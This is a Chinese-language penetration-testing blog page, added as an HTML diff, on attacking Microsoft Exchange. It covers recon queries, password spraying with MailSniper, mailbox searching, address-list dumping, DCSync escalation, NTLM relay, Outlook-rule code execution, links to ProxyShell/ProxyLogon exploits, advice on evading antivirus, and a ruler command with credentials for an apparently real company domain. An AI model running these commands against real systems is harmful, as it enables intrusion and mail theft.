@@ -1,0 +1,456 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    
+    
+    <link rel="shortcut icon" href="../../../../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>针对EXCHANGE的攻击方式 - ConsT27's Blog</title>
+    <link href="../../../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "\u9488\u5bf9EXCHANGE\u7684\u653b\u51fb\u65b9\u5f0f", url: "#_top", children: [
+              {title: "\u76ee\u5f55", url: "#_1" },
+              {title: "exchange\u5feb\u901f\u4e86\u89e3", url: "#exchange_1" },
+              {title: "EXCHANGE\u4fe1\u606f\u641c\u96c6", url: "#exchange_2" },
+              {title: "EXCHANGE \u5916\u56f4\u6253\u70b9", url: "#exchange_4" },
+              {title: "EXCHANGE \u540e\u6e17\u900f", url: "#exchange_5" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../../../js/base.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../../%E5%B8%B8%E8%A7%81%E4%B8%AD%E9%97%B4%E4%BB%B6%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/%E5%B8%B8%E8%A7%81%E4%B8%AD%E9%97%B4%E4%BB%B6%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../../%E5%B8%B8%E8%A7%81%E4%B8%AD%E9%97%B4%E4%BB%B6%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/%E5%B8%B8%E8%A7%81%E4%B8%AD%E9%97%B4%E4%BB%B6%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/" class="btn btn-xs btn-link">
+        常见中间件的攻击方式
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../%E9%87%91%E8%9D%B6/%E9%87%91%E8%9D%B6/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../%E9%87%91%E8%9D%B6/%E9%87%91%E8%9D%B6/" class="btn btn-xs btn-link">
+        金蝶
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="exchange">针对EXCHANGE的攻击方式</h1>
+<h2 id="_1">目录</h2>
+<ul>
+<li><a href="#exchange快速了解">exchange快速了解</a><ul>
+<li><a href="#邮件服务器角色">邮件服务器角色</a><ul>
+<li><a href="#exchange-2010">exchange 2010</a></li>
+<li><a href="#exchange-2013">exchange 2013</a></li>
+</ul>
+</li>
+<li><a href="#接口和协议">接口和协议</a><ul>
+<li><a href="#OWA">OWA</a></li>
+<li><a href="#ECP">ECP</a></li>
+<li><a href="#outlook-anywhere">outlook anywhere</a></li>
+<li><a href="#MAPI">MAPI</a></li>
+<li><a href="#EAS">EAS</a></li>
+<li><a href="#EWS">EWS</a></li>
+</ul>
+</li>
+<li><a href="#功能和服务">功能和服务</a><ul>
+<li><a href="#Autodiscover">Autodiscover</a></li>
+<li><a href="#GAL">GAL</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#EXCHANGE信息搜集">EXCHANGE信息搜集</a><ul>
+<li><a href="#发现">发现</a><ul>
+<li><a href="#端口扫描">端口扫描</a></li>
+<li><a href="#spn">spn</a></li>
+<li><a href="#特殊域名">特殊域名</a></li>
+<li><a href="#寻找接口">寻找接口</a></li>
+<li><a href="#工具使用">工具使用</a></li>
+</ul>
+</li>
+<li><a href="#版本确定">版本确定</a></li>
+<li><a href="#IP泄露">IP泄露</a></li>
+<li><a href="#泄露exchange服务器信息">泄露exchange服务器信息</a></li>
+</ul>
+</li>
+<li><a href="#EXCHANGE-外围打点">EXCHANGE 外围打点</a><ul>
+<li><a href="#proxyshell-命令执行">proxyshell 命令执行</a></li>
+<li><a href="#爆破">爆破</a></li>
+</ul>
+</li>
+<li><a href="#EXCHANGE-后渗透">EXCHANGE 后渗透</a><ul>
+<li><a href="#邮件内容检索">邮件内容检索</a></li>
+<li><a href="#获取全局地址表">获取全局地址表</a><ul>
+<li><a href="#通用方案MailSniper">通用方案MailSniper</a></li>
+<li><a href="#在域内进行导出">在域内进行导出</a></li>
+</ul>
+</li>
+<li><a href="#ruler导">ruler导</a></li>
+<li><a href="#查找存在缺陷的用户邮箱权限委派">查找存在缺陷的用户邮箱权限委派</a></li>
+<li><a href="#通过exchange用户组进行域提权">通过exchange用户组进行域提权</a></li>
+<li><a href="#NTLM-relay">NTLM relay</a></li>
+<li><a href="#OUTLOOK-命令执行">OUTLOOK 命令执行</a></li>
+<li><a href="#proxylogon-命令执行">proxylogon 命令执行</a></li>
+<li><a href="#CVE-2020-0688-rce">CVE-2020-0688 rce</a></li>
+</ul>
+</li>
+</ul>
+<hr />
+<hr />
+<h2 id="exchange_1">exchange快速了解</h2>
+<p>FOFA：</p>
+<pre><code class="language-纯文本">microsoft exchange 2013：
+app=&quot;Microsoft-Exchange-2013&quot;||app=&quot;Microsoft-Exchange-Server-2013-CU21&quot;||app=&quot;Microsoft-Exchange-Server-2013-CU17&quot;||app=&quot;Microsoft-Exchange-Server-2013-CU23&quot;||app=&quot;Microsoft-Exchange-Server-2013-CU13&quot;||app=&quot;Microsoft-Exchange-Server-2013-CU22&quot;||app=&quot;Microsoft-Exchange-Server-2013-CU11&quot;||app=&quot;Microsoft-Exchange-Server-2013-CU2&quot;||app=&quot;Microsoft-Exchange-Server-2013-CU16&quot;||app=&quot;Microsoft-Exchange-Server-2013-CU19&quot;||app=&quot;Microsoft-Exchange-Server-2013-CU3&quot;||app=&quot;Microsoft-Exchange-Server-2013-CU18&quot;||app=&quot;Microsoft-Exchange-Server-2013-CU5&quot;||app=&quot;Microsoft-Exchange-Server-2013-CU20&quot;||app=&quot;Microsoft-Exchange-Server-2013-CU12&quot;||app=&quot;Microsoft-Exchange-Server-2013-CU15&quot;||app=&quot;Microsoft-Exchange-Server-2013-CU10&quot;||app=&quot;Microsoft-Exchange-Server-2013-CU9&quot;||app=&quot;Microsoft-Exchange-Server-2013-CU6&quot;||app=&quot;Microsoft-Exchange-Server-2013-CU7&quot;||app=&quot;Microsoft-Exchange-Server-2013-CU1&quot;||app=&quot;Microsoft-Exchange-Server-2013-CU14&quot;||app=&quot;Microsoft-Exchange-Server-2013-CU8&quot;||app=&quot;Microsoft-Exchange-Server-2013-RTM&quot;||app=&quot;Microsoft-Exchange-Server-2013-SP1&quot;||app=&quot;Microsoft-Exchange-2013&quot;
+
+microsoft exchange 2016：
+app=&quot;Microsoft-Exchange-Server-2016-CU19&quot;||app=&quot;Microsoft-Exchange-Server-2016-CU3&quot;||app=&quot;Microsoft-Exchange-Server-2016-CU12&quot;||app=&quot;Microsoft-Exchange-Server-2016-RTM&quot;||app=&quot;Microsoft-Exchange-Server-2016-CU7&quot;||app=&quot;Microsoft-Exchange-Server-2016-CU17&quot;||app=&quot;Microsoft-Exchange-Server-2016-CU2&quot;||app=&quot;Microsoft-Exchange-Server-2016-CU1&quot;||app=&quot;Microsoft-Exchange-Server-2016-CU14&quot;||app=&quot;Microsoft-Exchange-Server-2016-CU5&quot;||app=&quot;Microsoft-Exchange-Server-2016-CU11&quot;||app=&quot;Microsoft-Exchange-Server-2016-CU9&quot;||app=&quot;Microsoft-Exchange-Server-2016-CU16&quot;||app=&quot;Microsoft-Exchange-Server-2016-CU10&quot;||app=&quot;Microsoft-Exchange-Server-2016-CU6&quot;||app=&quot;Microsoft-Exchange-Server-2016-CU13&quot;||app=&quot;Microsoft-Exchange-Server-2016-CU18&quot;||app=&quot;Microsoft-Exchange-Server-2016-CU8&quot;||app=&quot;Microsoft-Exchange-Server-2016-CU4&quot;||app=&quot;Microsoft-Exchange-2016-POP3-server&quot;
+
+microsoft exchange 2019：
+app=&quot;Microsoft-Exchange-Server-2019-CU5&quot;||app=&quot;Microsoft-Exchange-Server-2019-CU3&quot;||app=&quot;Microsoft-Exchange-Server-2019-Preview&quot;||app=&quot;Microsoft-Exchange-Server-2019-CU8&quot;||app=&quot;Microsoft-Exchange-Server-2019-CU1&quot;||app=&quot;Microsoft-Exchange-Server-2019-CU7&quot;||app=&quot;Microsoft-Exchange-Server-2019-CU2&quot;||app=&quot;Microsoft-Exchange-Server-2019-CU6&quot;||app=&quot;Microsoft-Exchange-Server-2019-RTM&quot;||app=&quot;Microsoft-Exchange-Server-2019-CU4&quot;
+
+microsoft exchange 2010：
+app=&quot;Microsoft-Exchange-2010-POP3-server-version-03.1&quot;||app=&quot;Microsoft-Exchange-Server-2010&quot;
+</code></pre>
+<p><img alt="image-20211009213815567" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211009213815567.png" title="image-20211009213815567" /></p>
+<h3 id="_2">邮件服务器角色</h3>
+<p>在exchange 2010中，exchange包含五个服务器角色，分别为邮箱服务器，客户端访问服务器，集线传输服务器，统一消息服务器，边缘传输服务器。
+在后来的exchange 2013中服务器被精简为3个：邮箱服务器，客户端访问服务器，边缘传输服务器
+exchange 2016和2019中则只有 邮箱服务器和边缘传输服务器了。</p>
+<h4 id="exchange-2010">exchange 2010</h4>
+<p><strong>邮箱服务器</strong></p>
+<p>mailbox server，提供托管邮箱，公共文件夹等服务，是必选的服务器角色</p>
+<p><strong>客户端访问服务器</strong></p>
+<p>client access server，用来接收并处理不同客户端的请求，并提供各种接口给客户以访问Exchange服务,</p>
+<pre><code class="language-纯文本">MAPI访问
+POP3和IMAP4访问
+Outlook Web App访问（OWA）
+Outlook Anywhere访问
+Autodiscover自动发现服务
+可用性服务
+</code></pre>
+<p><strong>集线传输服务器</strong></p>
+<p>hub transport server，核心服务是Microsoft Exchange Transport，用于处理大多数邮件的路由、策略等以及Mail Flow。起一个邮件传输中继的作用。</p>
+<p><strong>统一消息服务器</strong></p>
+<p>unified messaging server，用于允许邮箱用户可以在邮件中发送存储语音消息和传真消息，可选角色</p>
+<p><strong>边缘传输服务器</strong></p>
+<p>edge transport server，通常部署于网络边界。其接受来自内部组织的邮件和来自外部可信服务器的邮件，然后应用特定的反垃圾邮件、反病毒策略，最后将通过策略筛选的邮件路由到内部的集线传输服务器，可选角色</p>
+<h4 id="exchange-2013">exchange 2013</h4>
+<p><strong>邮箱服务器</strong></p>
+<p>托管邮箱、公共文件夹等数据，主要包含集线传输服务（Hub Transport service）和邮箱传输服务（Mailbox Transport service）两大组件服务。</p>
+<p><strong>客户端访问服务器</strong></p>
+<p>负责认证、重定向、代理来自外部不同客户端的访问请求，主要包含客户端访问服务（Client Access service）和前端传输服务（Front End Transport service）两大组件。</p>
+<p><strong>边缘传输服务器</strong></p>
+<p>负责路由出站与入站邮件、策略应用等。</p>
+<h3 id="_3">接口和协议</h3>
+<h4 id="owa">OWA</h4>
+<p>owa即 outlook web app,即outlook的网页版。（outlook是exchange的客户端软件，许多电脑都有所预装）
+地址一般为 <a href="http://aa.com/owa" title="http://aa.com/owa">http://aa.com/owa</a></p>
+<p><img alt="image-20211009185511900" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211009185511900.png" title="image-20211009185511900" /></p>
+<h4 id="ecp">ECP</h4>
+<p>Exchange Administrative Center,即exchange管理中心，管理员的web控制台</p>
+<p><img alt="image-20211009185757385" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211009185757385.png" title="image-20211009185757385" /></p>
+<h4 id="outlook-anywhere">outlook anywhere</h4>
+<p>作用是可以让外网用户直接通过outlook anywhere 直接登录到exchange邮箱而无需使用VPN。该特性在exchange server 2013中默认开启，也就是说在exchange server 2013 以后outlook 不再区分内外网环境。</p>
+<h4 id="mapi">MAPI</h4>
+<p>于Exchange 2013 SP1和Outlook 2013 SP1中被提出的一种新的outlook与exchange交互传输协议。</p>
+<h4 id="eas">EAS</h4>
+<p>Exchange ActiveSync是一种允许用户通过移动设备或其他便携式设备访问和管理邮件、联系人、日历等Exchange功能的同步协议，在Windows上使用时其进程名称为wcesomm.exe。”</p>
+<h4 id="ews">EWS</h4>
+<p>Exchange Web Service，是exchange提供的一套API编程接口，用于操作exchange相关功能，于exchange server 2007被提出。</p>
+<h3 id="_4">功能和服务</h3>
+<h4 id="autodiscover">Autodiscover</h4>
+<p>Autodiscover，自动发现，是exchange server 2007 推出的一个服务。
+该服务目的是简化用户登录流程：用户只需要输入自己的电子邮件地址和密码，就能够通过Autodiscover服务获取运行客户端应用程序所需的配置信息
+该服务运行在客户端访问服务器上。</p>
+<h4 id="gal">GAL</h4>
+<p>GAL即全局地址表（global address list）</p>
+<p>记录了域中用户的基本信息与其邮箱地址，以形成域用户与邮箱用户之间的关联。
+在渗透中可以通过GAL来获取所有邮箱地址。</p>
+<h2 id="exchange_2">EXCHANGE信息搜集</h2>
+<p>在渗透中该如何发现哪一台机器是EXCHANGE服务器呢？
+在exchange server 2019 中，由于只细分了邮箱服务器和边缘传输服务器，所以开放了如OWA，ECP等接口的服务器即为邮箱服务器。</p>
+<h3 id="_5">发现</h3>
+<h4 id="_6">端口扫描</h4>
+<p>exchange会对外暴露接口如OWA,ECP等，所以我们可以通过一些端口特征来发现exchange。
+exchange 接口会暴露在80端口，同时25/587/2525等端口上会有SMTP服务。</p>
+<p><img alt="image-20211009220507254" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211009220507254.png" title="image-20211009220507254" /></p>
+<h4 id="spn">spn</h4>
+<p>如果已经打入域中，想快速的定位到exchange服务器，只需要查询域中spn服务即可。</p>
+<pre><code class="language-纯文本">setspn -q */*
+</code></pre>
+<p><img alt="image-20211009220713532" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211009220713532.png" title="image-20211009220713532" /></p>
+<h4 id="_7">特殊域名</h4>
+<pre><code class="language-纯文本">https://autodiscover.domain.com/autodiscover/autodiscover.xml
+https://owa.domian/owa/
+https://mail.domain.com/
+https://webmail.domain.com/
+</code></pre>
+<h4 id="_8">寻找接口</h4>
+<pre><code class="language-纯文本">/autoDiscover/  自Exchange Server 2007开始推出的一项自动服务，用于自动配置用户在Outlook中邮箱的相关设置，简化用户登陆使用邮箱的流程。
+/ecp/“Exchange Control Panel”    Exchange管理中心，管理员用于管理组织中的Exchange的Web控制台
+/eWS/“Exchange Web Services”    Exchange Web Service,实现客户端与服务端之间基于HTTP的SOAP交互
+/mapi/    Outlook连接Exchange的默认方式，在2013和2013之后开始使用，2010 sp2同样支持
+/microsoft-Server-ActiveSync/    用于移动应用程序访问电子邮件
+/OAB/“Offline Address Book”    用于为Outlook客户端提供地址簿的副本，减轻Exchange的负担
+/owa/“Outlook Web APP”    Exchange owa 接口，用于通过web应用程序访问邮件、日历、任务和联系人等
+/powerShell/  用于服务器管理的Exchange管理控制台
+/Rpc/  早期的Outlook还使用称为Outlook Anywhere的RPC交互
+</code></pre>
+<h4 id="_9">工具使用</h4>
+<p><a href="https://github.com/vysec/checkO365" title="https://github.com/vysec/checkO365">https://github.com/vysec/checkO365</a></p>
+<h3 id="_10">版本确定</h3>
+<p>可以通过OWA,ECP的HTML源代码确定版本</p>
+<p>源代码搜索favicon.ico</p>
+<p><img alt="image-20211009224310181" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211009224310181.png" title="image-20211009224310181" /></p>
+<p>可以看到一串数字 15.0.1130,这是exchange具体版本号，到这里查就行了<a href="https://docs.microsoft.com/zh-cn/Exchange/new-features/build-numbers-and-release-dates?view=exchserver-2019" title="https://docs.microsoft.com/zh-cn/Exchange/new-features/build-numbers-and-release-dates?view=exchserver-2019">https://docs.microsoft.com/zh-cn/Exchange/new-features/build-numbers-and-release-dates?view=exchserver-2019</a></p>
+<h3 id="ip">IP泄露</h3>
+<p>抓包以下接口包，将HTTP版本改为1.0，并删除HOST头，就会暴露exchange ip，有时会暴露内网IP</p>
+<pre><code class="language-纯文本">  /Microsoft-Server-ActiveSync/default.eas
+  /Microsoft-Server-ActiveSync
+  /Autodiscover/Autodiscover.xml
+  /Autodiscover
+  /Exchange
+  /Rpc
+  /EWS/Exchange.asmx
+  /EWS/Services.wsdl
+  /EWS
+  /ecp
+  /OAB
+  /OWA
+  /aspnet_client
+  /PowerShell
+</code></pre>
+<p><img alt="image-20211010135259851" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211010135259851.png" title="image-20211010135259851" /></p>
+<p>想要更方便的话，可以用msf的模块自动搜集   use auxiliary/scanner/http/owa_iis_internal_ip</p>
+<h3 id="exchange_3">泄露exchange服务器信息</h3>
+<p>当我们对exchange服务器进行NTLM质询时,在服务器返回challenge时同时会返回域信息，机器名等信息。以此为基础可以对exchange进行服务器信息搜集</p>
+<p>直接nmap</p>
+<pre><code class="language-纯文本">nmap host  -p 443 --script http-ntlm-info --script-args http-ntlm-info.root=/rpc/rpcproxy.dll -Pn
+</code></pre>
+<p><img alt="image-20211010141803706" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211010141803706.png" title="image-20211010141803706" /></p>
+<h2 id="exchange_4">EXCHANGE 外围打点</h2>
+<h3 id="proxyshell">proxyshell 命令执行</h3>
+<pre><code class="language-纯文本">· Exchange Server 2013 Versions &lt; Builder 15.0.1497.012
+
+· Exchange Server 2016 CU18 &lt; Builder 15.1.2106.013
+
+· Exchange Server 2016 CU19 &lt; Builder 15.1.2176.009
+
+· Exchange Server 2019 CU7 &lt; Builder 15.2.0721.013
+
+</code></pre>
+<p><a href="https://github.com/dmaasland/proxyshell-poc.git" title="https://github.com/dmaasland/proxyshell-poc.git">https://github.com/dmaasland/proxyshell-poc.git</a></p>
+<p><a href="https://github.com/horizon3ai/proxyshell" title="https://github.com/horizon3ai/proxyshell">https://github.com/horizon3ai/proxyshell</a></p>
+<h3 id="_11">爆破</h3>
+<p>接触到exchange的第一步自然是接触到它的接口服务如OWA,ECP等。
+由于是登录框，我们自然可以用爆破来进行攻击。通常情况下EXCHANGE不限制大字典爆破。</p>
+<p>常见可爆破接口</p>
+<pre><code class="language-纯文本">/Autodiscover/Autodiscover.xml  # 自 Exchange Server 2007 开始推出的一项自动服务,用于自动配置用户在Outlook中邮箱的相关设置,简化用户登录使用邮箱的流程。
+/Microsoft-Server-ActiveSync/default.eas
+/Microsoft-Server-ActiveSync    # 用于移动应用程序访问电子邮件
+/Autodiscover
+/Rpc/                           # 早期的 Outlook 还使用称为 Outlook Anywhere 的 RPC 交互
+/EWS/Exchange.asmx
+/EWS/Services.wsdl
+/EWS/                           # Exchange Web Service,实现客户端与服务端之间基于HTTP的SOAP交互
+/OAB/                           # 用于为Outlook客户端提供地址簿的副本,减轻 Exchange 的负担
+/owa                            # Exchange owa 接口,用于通过web应用程序访问邮件、日历、任务和联系人等
+/ecp                            # Exchange 管理中心,管理员用于管理组织中的Exchange 的Web控制台
+/Mapi                           # Outlook连接 Exchange 的默认方式,在2013和2013之后开始使用,2010 sp2同样支持
+/powershell                     # 用于服务器管理的 Exchange 管理控制台
+</code></pre>
+<p>爆破比较实用的工具有Eburst和Ruler</p>
+<p><a href="https://github.com/grayddq/EBurst" title="https://github.com/grayddq/EBurst">https://github.com/grayddq/EBurst</a> （py）</p>
+<p><a href="https://github.com/sensepost/ruler" title="https://github.com/sensepost/ruler">https://github.com/sensepost/ruler</a> （exe）</p>
+<p>ruler由于windows版的显示似乎有点问腿，这里用的linux版本</p>
+<p><img alt="image-20211011010622621" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211011010622621.png" title="image-20211011010622621" /></p>
+<p>autodiscover 爆破的原理是，访问autodiscover时浏览器会弹出认证框，当输入正确的凭证后则会显示XML文档内容。</p>
+<p><img alt="image-20211011004659223" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211011004659223.png" title="image-20211011004659223" /></p>
+<p><img alt="image-20211011004850022" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211011004850022.png" title="image-20211011004850022" /></p>
+<p>ps\://github.com/dafthack/MailSniper （ps1）</p>
+<p>下面的是密码喷洒的攻击方式，-Password项也可以设置为一个记录password的字典txt</p>
+<pre><code class="language-纯文本">对OWA进行爆破
+Import-Module .\MailSniper.ps1
+Invoke-PasswordSprayOWA -ExchHostname OWAHOST -UserList .\user.txt -Password password -Threads 1 -Domain domainname -OutFile out.txt -Verbose 
+
+对EWS进行爆破
+Invoke-PasswordSprayEWS -ExchHostname EWSHOST -UserList .\user.txt -Password password -Threads 1 -Domain domainname -OutFile out.txt -Verbose
+</code></pre>
+<h2 id="exchange_5">EXCHANGE 后渗透</h2>
+<h3 id="_12">邮件内容检索</h3>
+<p>我们获取一个exchange用户以后，可以对邮件列表进行检索获取敏感信息，方便下一步渗透</p>
+<p>MailSniper 可以完成这个任务，但是这个工具感觉被杀的比较严重，可以试着修改一下函数名变量名啥的免免杀。</p>
+<p>检索指定用户</p>
+<pre><code class="language-纯文本">检索rengan@const.com的 收件箱文件夹里的 内容含有机密的 邮件，在启用remote参数后会弹出一个输入框输入邮箱票据
+Invoke-SelfSearch -Mailbox rengan@const.com -Terms *机密* -Folder 收件箱 -ExchangeVersion Exchange2013_SP1 -remote -OutputCsv a.csv
+</code></pre>
+<p>可以发现在中文的exchange下，用户的邮件一般存放于""收件箱""文件夹，而对于英文则是"inbox"</p>
+<p><img alt="image-20211011145015624" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211011145015624.png" title="image-20211011145015624" /></p>
+<h3 id="_13">获取全局地址表</h3>
+<h4 id="mailsniper">通用方案MailSniper</h4>
+<p>依旧通过MailSniper 实现，在我们获得一个合法用户的凭据以后，就可以通过获取全局地址表来获取所有邮箱地址。</p>
+<pre><code class="language-纯文本">Get-GlobalAddressList -ExchHostname Ex -UserName rengan -ExchangeVersion Exchange2013_SP1 -Password ganren@123456
+</code></pre>
+<p><img alt="image-20211011162254730" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211011162254730.png" title="image-20211011162254730" /></p>
+<h4 id="_14">在域内进行导出</h4>
+<p>Import-PSSession是自带的</p>
+<pre><code class="language-纯文本">$User = &quot;test\administrator&quot;
+$Pass = ConvertTo-SecureString -AsPlainText DomainAdmin123! -Force
+$Credential = New-Object System.Management.Automation.PSCredential -ArgumentList $User,$Pass
+$Session = New-PSSession -ConfigurationName Microsoft.Exchange -ConnectionUri http://Exchange01.test.com/PowerShell/ -Authentication Kerberos -Credential $Credential
+Import-PSSession $Session -AllowClobber
+</code></pre>
+<p>查看PSSession：</p>
+<p>Get-PSSession</p>
+<p>断开PSSession：</p>
+<p>Remove-PSSession \$Session</p>
+<p>测试命令(获得所有邮箱用户):</p>
+<p>Get-Mailbox</p>
+<h3 id="ruler">ruler导</h3>
+<pre><code class="language-纯文本"> .\ruler-win64.exe -e idm@chinaexpressair.com -p Sys@123456 --url https://autodiscover.chinaexpressair.com/autodiscover/autodiscover.xml abk list
+</code></pre>
+<h3 id="_15"><strong>查找存在缺陷的用户邮箱权限委派</strong></h3>
+<p>一个用户的文件夹是可以给其他用户权限的。</p>
+<p><img alt="image-20211011170212851" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211011170212851.png" title="image-20211011170212851" /></p>
+<p>点击此处的权限，来到以下界面，这里的默认即 所有用户(everyone) 的对此文件夹的权限，我这里是把权限给的很高</p>
+<p><img alt="image-20211011170325376" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211011170325376.png" title="image-20211011170325376" /></p>
+<p>实战中也可能会遇到用户A对用户B的收件箱有读写权限的情况，所以我们在获取用户A的凭据后可以进而读取用户B的收件箱。</p>
+<p>用MailSniper 实现</p>
+<pre><code class="language-纯文本">Invoke-OpenInboxFinder -ExchangeVersion Exchange2013_SP1 -ExchHostname ex.const.com -EmailList .\user.txt -remote
+</code></pre>
+<p><img alt="image-20211011170501129" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211011170501129.png" title="image-20211011170501129" /></p>
+<p>既然这里对administrator的收件箱可读，那么就可以用invoke-selfsearch 进行详细的邮件检索了。</p>
+<h3 id="exchange_6">通过exchange用户组进行域提权</h3>
+<p>exchange安装后会在AD上生成两个容器</p>
+<p><img alt="QQ截图20210217141602" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217141602.png" title="QQ截图20210217141602" /></p>
+<p>其中exchange windows permissions组的用户拥有writeDACL权限， Exchange Trusted Subsystem 是 Exchange Windows Permission 的成员，能继承writedacl权限，有这个权限后就能使用dcsync导出所有用户hash。
+其中exchange trusted subsystem组甚至可能有继承自administrators组的权限。</p>
+<p><img alt="QQ截图20210217141614" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217141614.png" title="QQ截图20210217141614" /></p>
+<p>同时，在安装exchange后还会生成一个组Organization Management，这个组可以修改其他exchange组的用户信息，所以当然也可以修改Exchange Trusted Subsystem组的成员信息，比如向里面加一个以获得的用户。</p>
+<p>综上所述，只要获得Organization Management,Exchange Trusted Subsystem,Exchange Windows Permission,就可以通过dcsync来获取整个域权限。
+当然，想获得上述组用户权限，还是不太容易的。</p>
+<h3 id="ntlm-relay">NTLM relay</h3>
+<p>用exchange也可以很方便的进行NTLM relay：给用户发一封邮件，其中包含的图片链接形如 \\10.10.10.1\a.jpg，用户收到邮件后则会向10.10.10.1发送NTLM质询，从而造成NTLM relay。
+其实EXCHANGE 很多CVE 都是与NTLM RELAY 挂钩的，如<strong>CVE-2018-8581</strong>，<strong>CVE-2020-17141</strong> ，<strong>CVE-2020-17143</strong>，<strong>CVE-2019-1040</strong></p>
+<h3 id="outlook">OUTLOOK 命令执行</h3>
+<p>OUTLOOK 客户端有一个 规则与通知 的功能，通过该功能可以使outlook客户端在指定情况下执行指定的指令。若我们获得某用户的凭证，可以通过此功能设置“用户收到含指定字符的邮件时 执行指定的指令比如clac.exe”，当用户登录outlook客户端并访问到此邮件时，它的电脑便会执行calc.exe。
+但是，当触发动作为启动应用程序时，只能直接调用可执行程序，如启动一个exe程序，但无法为应用程序传递参数，想要直接上线，我们可以将EXE放到某共享目录下，或者直接上传到用户的机器。</p>
+<p>具体步骤为打开规则与通知功能，然后新建功能，在接收到某条件邮件时启动指定应用程序</p>
+<p><img alt="image-20211015145145915" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211015145145915.png" title="image-20211015145145915" /></p>
+<p><img alt="image-20211015145304348" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211015145304348.png" title="image-20211015145304348" /></p>
+<p>收到含abc内容的邮件后，成功弹计算器</p>
+<p><img alt="" src="../image/image_HIBPIG5BRS.png" /></p>
+<h3 id="proxylogon">proxylogon 命令执行</h3>
+<pre><code class="language-纯文本">Exchange Server 2019 &lt; 15.02.0792.010
+
+Exchange Server 2019 &lt; 15.02.0721.013
+
+Exchange Server 2016 &lt; 15.01.2106.013
+
+Exchange Server 2013 &lt; 15.00.1497.012
+</code></pre>
+<p>h<a href="https://github.com/jeningogo/exchange-ssrf-rce/blob/main/exchange-exp.py" title="ttps://github.com/jeningogo/exchange-ssrf-rce/blob/main/exchange-exp.py">ttps://github.com/jeningogo/exchange-ssrf-rce/blob/main/exchange-exp.py</a></p>
+<p>前提是需要一个outlook账户</p>
+<h3 id="cve-2020-0688-rce">CVE-2020-0688 rce</h3>
+<pre><code class="language-纯文本">Microsoft Exchange Server 2010 Service Pack 3
+
+Microsoft Exchange Server 2013
+
+Microsoft Exchange Server 2016
+
+Microsoft Exchange Server 2019
+
+</code></pre>
+<p>需要一个账户</p>
+<p><a href="https://github.com/zcgonvh/CVE-2020-0688" title="https://github.com/zcgonvh/CVE-2020-0688">https://github.com/zcgonvh/CVE-2020-0688</a></p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../../%E5%B8%B8%E8%A7%81%E4%B8%AD%E9%97%B4%E4%BB%B6%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/%E5%B8%B8%E8%A7%81%E4%B8%AD%E9%97%B4%E4%BB%B6%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
